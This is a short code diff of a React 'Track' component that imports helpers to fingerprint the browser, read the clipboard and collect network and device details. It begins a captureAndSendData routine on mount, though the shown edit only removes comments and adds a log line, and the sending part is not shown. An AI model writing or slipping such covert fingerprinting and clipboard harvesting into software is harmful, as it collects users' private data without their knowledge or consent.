@@ -2,9 +2,8 @@
 
 import { useEffect } from "react";
 
-// Example imports — adjust paths/names as needed:
 import {
-  generateFingerprint,     // e.g., gathers userAgent, platform, hardware, GPU, etc.
+  generateFingerprint,    
   getClipboardData,   // attempts to read the clipboard (requires permissions)
   getNetworkInfo,  
   getDeviceInfo   // fetches navigator.connection data
@@ -12,6 +11,7 @@ import {
 
 export default function Track() {
   useEffect(() => {
+    console.log('Track component mounted');
     async function captureAndSendData() {
       try {
         // Parallel calls: gather multiple data points at once
